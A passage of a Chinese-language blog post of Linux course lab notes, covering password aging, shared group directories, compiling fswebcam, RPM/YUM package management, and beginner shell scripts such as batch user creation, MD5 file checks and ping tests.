src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/6.jpg" alt="img"></p><hr><h2 id="口令时限机制"><a href="#口令时限机制" class="headerlink" title="口令时限机制"></a>口令时限机制</h2><p>每个用户账号的口令时效配置参数体现在 &#x2F;etc&#x2F;shadow</p><p>设置口令时效信息有两种方式：</p><ol><li>对所有新建立的用户自动设置并启动口令时效机制，需要修改建立用户的默认配置文件 &#x2F;etc&#x2F;login.defs 以及 &#x2F;etc&#x2F;default&#x2F;useradd</li><li>对已经建立好的用户账号，可以用<code>chage</code>命令修改口令时效参数</li></ol><p>在 &#x2F;etc&#x2F;login.defs 修改系统关于口令的默认设置，使得密码长度不小于8位，口令有效期为60天</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/5.jpg" alt="img"></p><p>&#x2F;etc&#x2F;default&#x2F;useradd</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/image-20241217002104424.png" alt="image-20241217002104424"></p><p>INACTIVE（口令从过期到锁定的时间）</p><p>EXPIRE（失效日期）</p><hr><h2 id="情景实验：Linux用户组共享目录权限配置"><a href="#情景实验：Linux用户组共享目录权限配置" class="headerlink" title="情景实验：Linux用户组共享目录权限配置"></a>情景实验：Linux用户组共享目录权限配置</h2><ol><li><p>某公司新来了5个合约为2年的员工（jack、tom、jerry、jason、ketty），这些人员成立了一个研发团队，为这些员工建立一个用户账号，并为建立用户账号把新建立的员工归属到附加组g_deepmind。要求，设定每个员工需要每隔90天修改密码，账号有效期到2023年12月31日。</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/7.jpg" alt="img"></p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/8.jpg" alt="img"></p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/91.jpg" alt="img"></p></li><li><p>为研发团队g_deepmind建立一个组共享目录&#x2F;home&#x2F;g_deepmind，使得g_deepmind组中的用户能够通过该共享目录&#x2F;home&#x2F;g_deepmind相互共享并交换文件，要求用户在该目录中建立的文件能够不能被其他用户随意删除（目录拥有者除外，可以设置目录拥有者为项目组长），并且自动与用户组成员共享。</p></li></ol><p>   <img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/101.jpg" alt="img"></p><ol start="3"><li><p>建立临时用户t_user1、t_user2，配置用户组g_deepmind，使得临时用户也可以切换g_deepmind为主组登陆系统，临时访问组共享目录&#x2F;home&#x2F;g_deepmind。</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/111.jpg" alt="img"></p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/121.jpg" alt="img"></p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/131.jpg" alt="img"></p></li></ol><hr><h1 id="Linux软件包安装与管理"><a href="#Linux软件包安装与管理" class="headerlink" title="Linux软件包安装与管理"></a>Linux软件包安装与管理</h1><h2 id="软件包依赖性"><a href="#软件包依赖性" class="headerlink" title="软件包依赖性"></a>软件包依赖性</h2><p>任务1：运行预先编译好的jpg图片查看可执行程序viewimage</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps41.jpg" alt="img"></p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps42.jpg" alt="img"></p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps43.jpg" alt="img"></p><p>任务2： 编译运行源码软件，cmatrix-1.2a.tar.gz</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps44.jpg" alt="img"></p><hr><h2 id="软件编译安装"><a href="#软件编译安装" class="headerlink" title="软件编译安装"></a>软件编译安装</h2><p>尝试在rhel6.3或者ubuntu18.04系统中编译fswebcam</p><p>上传并解压fswebcam_20140113.orig.tar.xz</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./configure<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>报错<code>configure: error: GD graphics library not found</code></p><p>安装 GD 库</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yum <span class="token function">install</span> gd-devel<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>不幸的是查无此库</p><p>尝试从源码编译 gd-devel，源码包下载：<a href="https://github.com/libgd/libgd/releases/download/gd-2.3.2/libgd-2.3.2.tar.xz">https://github.com/libgd/libgd/releases/download/gd-2.3.2/libgd-2.3.2.tar.xz</a></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./configure<span class="token function">make</span><span class="token operator">&amp;&amp;</span><span class="token function">make</span> <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这样就可以编译 fswebcam 了</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./configure<span class="token function">make</span><span class="token operator">&amp;&amp;</span><span class="token function">make</span> <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/image-20241106012228777.png" alt="image-20241106012228777"></p><p>尝试以不同分辨率运行</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">fswebcam <span class="token parameter variable">-r</span> 800x600 --no-banner d1.jpg <span class="token parameter variable">-d</span> /dev/video0fswebcam <span class="token parameter variable">-r</span> 960x720 --no-banner d2.jpg <span class="token parameter variable">-d</span> /dev/video0fswebcam <span class="token parameter variable">-r</span> 640x480 --no-banner d3.jpg <span class="token parameter variable">-d</span> /dev/video0fswebcam <span class="token parameter variable">-D</span> <span class="token number">10</span> <span class="token parameter variable">-r</span> 640x480 --no-banner d3.jpg <span class="token parameter variable">-d</span> /dev/video0fswebcam <span class="token parameter variable">-D</span> <span class="token number">2</span> <span class="token parameter variable">--title</span> <span class="token string">"welcome"</span> <span class="token parameter variable">-r</span> 640x480  d3.jpg <span class="token parameter variable">-d</span> /dev/video0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行时报错<code>fswebcam: error while loading shared libraries: libgd.so.3: cannot open shared object file: No such file or directory</code>，没找到库文件</p><p>全局搜索对应文件并添加 LD_LIBRARY_PATH</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-name</span> <span class="token string">"libgd.so.3"</span><span class="token builtin class-name">export</span> <span class="token assign-left variable">LD_LIBRARY_PATH</span><span class="token operator">=</span>/root/ex_lab/libgd-2.3.2/src/.libs:<span class="token variable">$LD_LIBRARY_PATH</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>然后就可以成功运行了</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/image-20241106012633210.png" alt="image-20241106012633210"></p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/image-20241106012744417.png" alt="image-20241106012744417"></p><hr><h2 id="RPM-amp-YUM（CentOS系）"><a href="#RPM-amp-YUM（CentOS系）" class="headerlink" title="RPM&amp;YUM（CentOS系）"></a>RPM&amp;YUM（CentOS系）</h2><ol><li><p>启动RHEL6.3虚拟机，使用root登陆，加载RHEL6.3安装光盘</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps26.jpg" alt="img"></p></li><li><p>使用“rpm -qa  | grep -i  SDL” 查看Linux系统中已经安装的软件包列表中是否包括有SDL、SDL-devel（SDL是一种游戏引擎开发库，SDL-devel是其对应开发包），如果有安装SDL-devel软件包，请使用rpm工具的卸载命令SDL-devel软件包；</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps27.jpg" alt="img"></p></li><li><p>使用rpm查询系统已经安装软件的命令查看Linux系统中是否已经安装SDL_image、SDL_image-devel软件包</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps28.jpg" alt="img"></p></li><li><p>进入光盘安装加载目录，在RHEL6.3安装光盘Packages目录中的查找SDL、SDL-devel以及alsa-lib-devel对应的rpm安装文件</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps29.jpg" alt="img"></p></li><li><p>使用查询rpm软件包中文件列表的命令<code>rpm -qpl</code>查看实验资源目录lab6中的SDL_image-1.2.12-9.el6.i686.rpm、SDL_image-devel-1.2.12-9.el6.i686.rpm两个rpm文件中包含有哪些文件</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps30.jpg" alt="img"></p></li><li><p>使用查询rpm软件包中文件列表的命令<code>rpm -qpl</code>查看SDL-1.2.14-3.el6.i686.rpm、SDL-devel-1.2.14-3.el6.i686.rpm 两个rpm软件包安装文件中包含有哪些文件</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps31.jpg" alt="img"></p></li><li><p>找出RHEL6.3安装光盘Packages目录中的libjpeg、libjpeg-devel软件包对应的rpm文件，使用rpm查询命令并找出当安装这2个rpm包将会向Linux文件系统安装了哪些文件？</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps32.jpg" alt="img"></p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps33.jpg" alt="img"></p></li><li><p>尝试使用rpm工具的安装命令安装SDL_image库对应的两个软件包： SDL_image-1.2.12-9.el6.i686.rpm、SDL_image-devel-1.2.12-9.el6.i686.rpm。</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps34.jpg" alt="img"></p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps35.jpg" alt="img"></p></li><li><p>尝试使用rpm工具的安装命令安装SDL_image库对应的两个软件包： SDL-1.2.14-3.el6.i686.rpm、SDL-devel-1.2.14-3.el6.i686.rpm。</p></li></ol><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps36.jpg" alt="img"></p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps37.jpg" alt="img"></p><ol start="10"><li><p>使用提供的yum本地源配置文件rhel-local.repo，配置RHEL6.3的安装光盘成为yum的本地源，并使用yum工具安装SDL-devel-1.2.14-3.el6.i686.rpm。</p><ul><li><p>复制rhel-local.repo到&#x2F;etc&#x2F;yum.repos.d目录；</p></li><li><p>执行yum  repolist查看yum是否正确配置本地yum源；</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps38.jpg" alt="img"></p></li><li><p>使用rpm工具查询当前系统是否安装软件包tree，如果已经安装，请尝试使用yum命令卸载tree，然后使用yum install tree命令安装tree软件包；</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps39.jpg" alt="img"></p></li><li><p>进入实验目录&#x2F;root&#x2F;lab6-xxx-xxx，执行以下命令安装rpm软件SDL-devel，注意观察安装过程中都安装了哪些软件包：<br>“yum  install  SDL-devel-1.2.14-3.el6.i686.rpm”</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps40.jpg" alt="img"></p></li></ul></li></ol><hr><h1 id="Linux-Shell脚本编程"><a href="#Linux-Shell脚本编程" class="headerlink" title="Linux Shell脚本编程"></a>Linux Shell脚本编程</h1><h2 id="系统变量"><a href="#系统变量" class="headerlink" title="系统变量"></a>系统变量</h2><p><code>$&#123;n&#125;</code>：位置变量</p><p><code>$?</code>：保存前一条 Shell 命令的执行返回值。通常0代表执行成功，非0代表执行有误</p><p><code>$*</code>：以&quot;$1 $2” 形式保存的所有的命令行参数，作为一个单独的变量</p><p><code>$@</code>：以&quot;$1” &quot;$2” 形式保存的所有命令行参数，作为一个集合使用</p><p><code>$0</code>：当前运行的脚本路径</p><p><code>$$</code>：返回当前进程的PID</p><hr><h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token punctuation">(</span>value0 value1 value2 value3 <span class="token punctuation">..</span>.<span class="token punctuation">)</span>name<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span>value0name<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span>value1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><code>$&#123;ARRAY_NAME[n]&#125;</code>：取得数组中的元素</p><p><code>$&#123;#ARRAY_NAME[@]&#125;</code>或<code>$&#123;#ARRAY_NAME[*]&#125;</code>：取得数组元素的个数</p><p><code>$&#123;#ARRAY_NAME[n]&#125;</code>：取得数组中单个分量的长度</p><hr><h2 id="键入"><a href="#键入" class="headerlink" title="键入"></a>键入</h2><p>内部命令 <code>read</code>，用于从键盘读入变量</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">read</span> <span class="token parameter variable">-p</span> <span class="token string">"提示语句"</span> varname、<span class="token builtin class-name">read</span> <span class="token parameter variable">-n</span> 字符个数 varname<span class="token builtin class-name">read</span> <span class="token parameter variable">-t</span> 时间 varname<span class="token comment"># 等待时间</span><span class="token builtin class-name">read</span> <span class="token parameter variable">-s</span> varname<span class="token comment"># 关闭回显</span><span class="token builtin class-name">read</span> <span class="token parameter variable">-a</span> arrayname<span class="token comment"># 输入数组</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="数学运算"><a href="#数学运算" class="headerlink" title="数学运算"></a>数学运算</h2><p><code>let</code>命令：在完整的赋值型数学表达式前加上 let 命令，就可以完成整数运算表达式的计算并赋值</p><p><code>expr</code>命令：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">expr</span> 操作数 运算符 操作数<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>$(())</code>与<code>$[]</code>：数学表达式计算</p><p><code>bc</code>：浮点数计算</p><hr><h2 id="实验-2"><a href="#实验-2" class="headerlink" title="实验"></a>实验</h2><ol><li><p>编写shell脚本count-fix.sh，实现计算1+2+3+4+5+6+7+8+…+100的和，并输出到屏幕上,分别使用for循环，while循环编写</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token assign-left variable">sum_for</span><span class="token operator">=</span><span class="token number">0</span><span class="token keyword">for</span> <span class="token variable"><span class="token punctuation">((</span>i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">&lt;=</span><span class="token number">100</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">))</span></span><span class="token keyword">do</span>    <span class="token assign-left variable">sum_for</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$((</span>sum_for <span class="token operator">+</span> i<span class="token variable">))</span></span><span class="token keyword">done</span><span class="token builtin class-name">echo</span> <span class="token string">"for: <span class="token variable">$sum_for</span>"</span><span class="token assign-left variable">sum_while</span><span class="token operator">=</span><span class="token number">0</span><span class="token assign-left variable">j</span><span class="token operator">=</span><span class="token number">1</span><span class="token keyword">while</span> <span class="token punctuation">[</span> <span class="token variable">$j</span> <span class="token parameter variable">-le</span> <span class="token number">100</span> <span class="token punctuation">]</span><span class="token keyword">do</span>    <span class="token assign-left variable">sum_while</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$((</span>sum_while <span class="token operator">+</span> j<span class="token variable">))</span></span>    <span class="token assign-left variable">j</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$((</span>j <span class="token operator">+</span> <span class="token number">1</span><span class="token variable">))</span></span><span class="token keyword">done</span><span class="token builtin class-name">echo</span> <span class="token string">"while: <span class="token variable">$sum_while</span>"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>使用bash的for循环语句编写一脚本batchmkdir.sh，能实现以下功能：在当前目录中建立10个目录，目录的命名形式为dir-1、dir-2、dir-3、…..dir-20，在程序中注意先判断待建立的目录是否已经存在。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token keyword">for</span> <span class="token variable"><span class="token punctuation">((</span>i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">&lt;=</span><span class="token number">10</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">))</span></span><span class="token keyword">do</span>    <span class="token assign-left variable">dir_name</span><span class="token operator">=</span><span class="token string">"dir-<span class="token variable">$i</span>"</span>    <span class="token comment"># 检查目录是否已存在</span>    <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token operator">!</span> <span class="token parameter variable">-d</span> <span class="token string">"<span class="token variable">$dir_name</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>        <span class="token function">mkdir</span> <span class="token string">"<span class="token variable">$dir_name</span>"</span>    <span class="token keyword">fi</span><span class="token keyword">done</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>编写一个shell脚本count.sh，实现如下功能，用户可以在count.sh脚本后面跟不同数字的命令行参数，使得脚本能计算不同数字的连加和，并在脚本中注意判断用户是否输入了一个参数，如当用户以“.&#x2F;count.sh 30”运行脚本时，能计算1+2+3+4+…+30，如果用户没有输入参数，则默认计算1到10的连加和。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token variable">$#</span> <span class="token parameter variable">-eq</span> <span class="token number">0</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>    <span class="token assign-left variable">end_num</span><span class="token operator">=</span><span class="token number">10</span><span class="token keyword">else</span>    <span class="token assign-left variable">end_num</span><span class="token operator">=</span><span class="token variable">$1</span><span class="token keyword">fi</span><span class="token assign-left variable">sum</span><span class="token operator">=</span><span class="token number">0</span><span class="token keyword">for</span> <span class="token variable"><span class="token punctuation">((</span>i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">&lt;=</span>$end_num<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">))</span></span><span class="token keyword">do</span>    <span class="token assign-left variable">sum</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$((</span>sum <span class="token operator">+</span> i<span class="token variable">))</span></span><span class="token keyword">done</span><span class="token builtin class-name">echo</span> <span class="token string">"和为: <span class="token variable">$sum</span>"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>编写一个脚本batchuser.sh，能批量建立10个用户帐号，并给用户帐号设定8位的随机密码，同时把该用户名与密码保存到指定的文件中&#x2F;root&#x2F;user-pass.txt，以便管理员分发密码；其中帐号的形式为user1、user2、…user10；保存用户名与密码的文件的每行的格式形式为：user1:ChczVZww</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token keyword">for</span> <span class="token variable"><span class="token punctuation">((</span>i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">&lt;=</span><span class="token number">10</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">))</span></span><span class="token keyword">do</span>    <span class="token assign-left variable">username</span><span class="token operator">=</span><span class="token string">"user<span class="token variable">$i</span>"</span>    <span class="token assign-left variable">password</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span>openssl rand <span class="token parameter variable">-base64</span> <span class="token number">6</span><span class="token variable">)</span></span>    <span class="token function">useradd</span> <span class="token parameter variable">-m</span> <span class="token variable">$username</span>    <span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token variable">$password</span><span class="token entity" title="\n">\n</span><span class="token variable">$password</span>"</span> <span class="token operator">|</span> <span class="token function">passwd</span> <span class="token variable">$username</span> <span class="token parameter variable">--stdin</span>    <span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable">$username</span>:<span class="token variable">$password</span>"</span> <span class="token operator">>></span> /root/user-pass.txt<span class="token keyword">done</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>编写一个shell脚本，实现以下功能：该脚本能读取usernamelist.txt中的用户列表（一行一个用户名）建立帐号，并给每个帐号设置8位随机密码，同时把该用户名与密码保存到指定userpass.txt 文件中，密码文件的格式同第4题的要求。要求要跳过空行。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token keyword">while</span> <span class="token assign-left variable"><span class="token environment constant">IFS</span></span><span class="token operator">=</span> <span class="token builtin class-name">read</span> <span class="token parameter variable">-r</span> username<span class="token keyword">do</span>    <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token parameter variable">-z</span> <span class="token string">"<span class="token variable">$username</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>        <span class="token builtin class-name">continue</span>    <span class="token keyword">fi</span>    <span class="token assign-left variable">password</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span>openssl rand <span class="token parameter variable">-base64</span> <span class="token number">6</span><span class="token variable">)</span></span>    <span class="token function">useradd</span> <span class="token parameter variable">-m</span> <span class="token variable">$username</span>    <span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token variable">$password</span><span class="token entity" title="\n">\n</span><span class="token variable">$password</span>"</span> <span class="token operator">|</span> <span class="token function">passwd</span> <span class="token variable">$username</span> <span class="token parameter variable">--stdin</span>    <span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable">$username</span>:<span class="token variable">$password</span>"</span> <span class="token operator">>></span> userpass.txt<span class="token keyword">done</span> <span class="token operator">&lt;</span> <span class="token string">"usernamelist.txt"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>脚本capprintfile.sh</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token keyword">for</span> <span class="token for-or-select variable">file</span> <span class="token keyword">in</span> <span class="token string">"<span class="token variable">$@</span>"</span><span class="token keyword">do</span> <span class="token builtin class-name">echo</span> <span class="token variable">$file</span><span class="token operator">|</span><span class="token function">tr</span> a-z A-Z<span class="token keyword">done</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>建立目录 &#x2F;root&#x2F;lab-shell&#x2F;，并使用 touch 命令建立一些空文件或者使用 mkdir 建立一些目录，然后以<code>./capprintfile.sh /  /root/lab-shell/*</code> 的形式运行脚本，观察结果</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps25.jpg" alt="img"></p><p>编写一个脚本，能把指定目录&#x2F;root&#x2F;lab-shell&#x2F;中的文件的文件名全改名为大写，并测试运行</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token builtin class-name">cd</span> /root/lab-shell/<span class="token keyword">for</span> <span class="token for-or-select variable">file</span> <span class="token keyword">in</span> *<span class="token keyword">do</span>    <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token parameter variable">-f</span> <span class="token string">"<span class="token variable">$file</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>        <span class="token assign-left variable">new_name</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable">$file</span>"</span> <span class="token operator">|</span> <span class="token function">tr</span> <span class="token string">'[:lower:]'</span> <span class="token string">'[:upper:]'</span><span class="token variable">)</span></span>        <span class="token function">mv</span> <span class="token string">"<span class="token variable">$file</span>"</span> <span class="token string">"<span class="token variable">$new_name</span>"</span>    <span class="token keyword">fi</span><span class="token keyword">done</span><span class="token builtin class-name">echo</span> <span class="token string">"Finished"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>设计一个脚本checkmd5.sh，实现用于检测Linux系统某些特定重要文件是否被修改的功能</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$#</span>"</span> <span class="token parameter variable">-ne</span> <span class="token number">1</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>    <span class="token builtin class-name">echo</span> <span class="token string">"Usage: <span class="token variable">$0</span> &lt;file_list_with_md5sum>"</span>    <span class="token builtin class-name">exit</span> <span class="token number">1</span><span class="token keyword">fi</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token operator">!</span> <span class="token parameter variable">-f</span> <span class="token string">"<span class="token variable">$1</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>    <span class="token builtin class-name">echo</span> <span class="token string">"Error: 文件列表不存在."</span>    <span class="token builtin class-name">exit</span> <span class="token number">1</span><span class="token keyword">fi</span><span class="token keyword">while</span> <span class="token assign-left variable"><span class="token environment constant">IFS</span></span><span class="token operator">=</span> <span class="token builtin class-name">read</span> <span class="token parameter variable">-r</span> line<span class="token keyword">do</span>    <span class="token assign-left variable">file</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable">$line</span>"</span> <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'&#123;print $1&#125;'</span><span class="token variable">)</span></span>    <span class="token assign-left variable">expected_md5</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable">$line</span>"</span> <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'&#123;print $2&#125;'</span><span class="token variable">)</span></span>        <span class="token assign-left variable">current_md5</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span>md5sum <span class="token string">"<span class="token variable">$file</span>"</span> <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'&#123;print $1&#125;'</span><span class="token variable">)</span></span>    <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$current_md5</span>"</span> <span class="token operator">!=</span> <span class="token string">"<span class="token variable">$expected_md5</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>        <span class="token builtin class-name">echo</span> <span class="token string">"文件 <span class="token variable">$file</span> 已被修改！"</span>    <span class="token keyword">else</span>        <span class="token builtin class-name">echo</span> <span class="token string">"文件 <span class="token variable">$file</span> 未被修改。"</span>    <span class="token keyword">fi</span><span class="token keyword">done</span> <span class="token operator">&lt;</span> <span class="token string">"<span class="token variable">$1</span>"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token comment"># 检查参数是否正确</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token variable">$#</span> <span class="token parameter variable">-ne</span> <span class="token number">1</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>    <span class="token builtin class-name">echo</span> <span class="token string">"Usage: <span class="token variable">$0</span> &lt;ip_list_file>"</span>    <span class="token builtin class-name">exit</span> <span class="token number">1</span><span class="token keyword">fi</span><span class="token assign-left variable">ip_list_file</span><span class="token operator">=</span><span class="token variable">$1</span><span class="token comment"># 检查文件是否存在</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token operator">!</span> <span class="token parameter variable">-f</span> <span class="token string">"<span class="token variable">$ip_list_file</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>    <span class="token builtin class-name">echo</span> <span class="token string">"Error: File <span class="token variable">$ip_list_file</span> not found."</span>    <span class="token builtin class-name">exit</span> <span class="token number">1</span><span class="token keyword">fi</span><span class="token comment"># 逐行读取 IP 地址并进行 ping 测试</span><span class="token keyword">while</span> <span class="token assign-left variable"><span class="token environment constant">IFS</span></span><span class="token operator">=</span> <span class="token builtin class-name">read</span> <span class="token parameter variable">-r</span> <span class="token function">ip</span><span class="token punctuation">;</span> <span class="token keyword">do</span>    <span class="token builtin class-name">echo</span> <span class="token string">"Pinging IP: <span class="token variable">$ip</span>"</span>    <span class="token function">ping</span> <span class="token parameter variable">-c</span> <span class="token number">1</span> <span class="token variable">$ip</span> <span class="token operator">></span> /dev/null    <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token variable">$?</span> <span class="token parameter variable">-eq</span> <span class="token number">0</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>        <span class="token builtin class-name">echo</span> <span class="token string">"Ping successful"</span>    <span class="token 